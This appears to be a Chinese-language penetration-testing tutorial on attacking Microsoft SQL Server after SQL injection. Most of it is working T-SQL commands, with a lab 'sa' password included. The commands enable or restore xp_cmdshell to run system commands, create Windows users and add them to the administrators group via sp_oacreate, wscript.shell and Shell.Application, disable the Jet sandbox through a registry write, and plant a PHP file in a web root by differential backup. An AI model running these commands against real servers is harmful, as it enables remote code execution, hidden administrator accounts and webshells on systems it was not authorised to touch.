# MSSQL利用（注入后）

#### 连接MSSQL

> 链接软件 链接：[https://pan.baidu.com/s/1ktIaeBcsD2qB\_KFzINRSxw](https://pan.baidu.com/s/1ktIaeBcsD2qB_KFzINRSxw) 提取码：yqry

**连接MSSQL 2000**

**新建连接：（数据库-&gt;新建链接-&gt;ms SQL server）**

![](../.gitbook/assets/image%20%2815%29.png)

**填写目的IP、目的端口、用户名、密码：**

**sa   360College**

**一直下一步，完成后，数据库导航窗口会出现一个连接，双击连接：**

![](../.gitbook/assets/image%20%2872%29.png)

若是第一次连接，双击会提示下载驱动文件，若不成功，需多次反复尝试

**新建SQL编辑器即可执行SQL语句：**

![](../.gitbook/assets/image%20%28104%29.png)

查询SQL Server版本SQL语句如下：

```text
select @@version;
```

执行结果：

![](../.gitbook/assets/image%20%2869%29.png)

**连接MSSQL 2008**

**新建连接：**

**填写目的IP、目的端口、用户名、密码：**

**新建查询：**

![&#x53EF;&#x80FD;&#x4F1A;&#x4E0B;&#x8F7D;&#x9A71;&#x52A8;](../.gitbook/assets/image%20%2888%29.png)

**执行SQL语句，查询所有的数据库名称：**

SQL语句：

```text
SELECT Name FROM Master..SysDatabases ORDER BY Name;
```

执行结果：

![](../.gitbook/assets/image%20%28152%29.png)

#### MSSQL利用方式

**xp\_cmdshell**

**1.直接利用：**

SQL语句：

```text
exec master..xp_cmdshell 'whoami';
```

SQL Server 2000结果：

![](../.gitbook/assets/image%20%28157%29.png)

SQL Server 2008结果：

![](../.gitbook/assets/image%20%28109%29.png)

xp\_cmdshell存储过程在 SQL Server 2005以后默认关闭，需要手动开启

开启xp\_cmdshell命令如下：

```text
exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell', 1;RECONFIGURE;
```

有的时候不支持多句执行，那就采用分步执行，开启xp\_cmdshell过程如下：

```text
exec sp_configure 'show advanced options', 1;       //开启高级选项
RECONFIGURE;                                        //配置生效
exec sp_configure 'xp_cmdshell', 1;                  //开启xp_cmdshell 
RECONFIGURE;                                        //配置生效
```

可以通过exec sp\_configure查看xp\_cmdshell状态：

```text
exec sp_configure
```

![](../.gitbook/assets/image%20%28108%29.png)

再次执行系统命令：

```text
exec master..xp_cmdshell 'whoami';
```

![](../.gitbook/assets/image%20%2895%29.png)

```text
exec master..xp_cmdshell 'ipconfig';
```

![](../.gitbook/assets/image%20%2841%29.png)

关闭xp\_cmdshell过程如下：

```text
exec sp_configure 'show advanced options', 1;       //开启高级选项
RECONFIGURE;                                        //配置生效
exec sp_configure'xp_cmdshell', 0;                  //关闭xp_cmdshell 
RECONFIGURE;                                        //配置生效
```

**2.恢复xp\_cmdshell：**

判断是否xp\_cmdshell存储过程，返回1代表存在：

```text
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'       
```

在SQL Server 2005及之前的版本，管理员可能采用下面命令可以将xp\_cmdshell删除：

```text
exec master..sp_dropextendedproc xp_cmdshell;
```

此时若使用xp\_cmdshell，会提示“未能找到存储过程”,如下：

![](../.gitbook/assets/image%20%2865%29.png)

需使用下面命令可以恢复：

```text
exec master.dbo.sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int;
```

恢复xp\_cmdshell需要xplog70.dll，但有的管理员会将xplog70.dll一并删除：

![](../.gitbook/assets/image%20%2885%29.png)

如果有上传权限，可以上传xplog70.dll，并执行：

```text
exec master.dbo.sp_addextendedproc xp_cmdshell,@dllname ='C:\xplog70.dll'declare @o int;
```

**sp\_oacreate**

SQL Server 2008不可用，SQL Server 2000可添加管理员用户：

DECLARE @js int EXEC sp\_oacreate 'ScriptControl',@js OUT EXEC sp\_OASetProperty @js, 'Language', 'JavaScript' EXEC sp\_OAMethod @js, 'Eval', NULL, 'var o=new ActiveXObject\("Shell.Users"\);z=o.create\("test1"\);z.changePassword\("test1",""\);z.setting\("AccountType"\)=3;'

**sp\_makewebtask**

SQL Server 2008不可用，SQL Server 2000可新建文件：

exec sp\_makewebtask 'C:\test1.php',' select ''&lt;?php phpinfo\(\);?&gt;'' ';;--

**wscript.shell**

SQL Server 2008、SQL Server 2000均可用：

declare @shell int exec sp\_oacreate 'wscript.shell',@shell output exec sp\_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user test2 test2 /add'

declare @shell int exec sp\_oacreate 'wscript.shell',@shell output exec sp\_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators test2 /add'

执行结果：

**Shell.Application**

SQL Server 2008不可用，SQL Server 2000可用：

declare @o int exec sp\_oacreate 'Shell.Application', @o out exec sp\_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user test3 test3 /add','c:\windows\system32','','1';

**沙盒模式**

只有Windows xp 与 Windows 2003可用：

开启沙盒模式：

exec master..xp\_regwrite 'HKEY\_LOCAL\_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG\_DWORD',0;--

执行系统命令：

select \* from openrowset\('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell\("cmd.exe /c net user test4 test4 /add"\)'\)

#### MSSQL差异备份

MSSQL 2008

查询库名：

```text
SELECT DB_NAME()
```

也可以创建数据库：

```text
create database test2;
```

先进行一次完整备份：

```text
backup database test2 to disk = 'c:\test2.bak';
```

使用数据库：

```text
use test2;
```

创建新表：

```text
create table [dbo].[test2] ([cmd] [image]);
```

向表中插入数据：

```text
insert into test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);
```

3c3f70687020706870696e666f28293b3f3e为16进制的&lt;?php phpinfo\(\);?&gt; 进行差异备份：

```text
backup database test2 to disk='C:\phpStudy\PHPTutorial\WWW\test2.php' WITH DIFFERENTIAL,FORMAT;
```

访问目标地址：

